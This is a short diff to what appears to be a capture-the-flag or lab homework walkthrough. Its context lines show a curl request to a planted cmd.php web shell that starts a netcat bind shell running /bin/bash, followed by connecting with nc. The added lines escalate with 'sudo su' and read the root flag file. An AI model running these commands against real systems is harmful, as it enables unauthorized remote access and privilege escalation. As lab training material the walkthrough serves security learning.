@@ -24,3 +24,11 @@ curl 'http://192.168.200.156/cmd.php?c=nc+-e+/bin/bash+-lvp+7331'
 #Remote Shells HOMEWORK - terminal 2:
 nc 192.168.200.156 7331
 ```
+
+## h 6.5 p
+```bash
+#Use the nc terminal from 6.4 (rerun 6.4 if closed):
+sudo su
+cat /root/root.txt
+#Submit the flag on the platform
+```
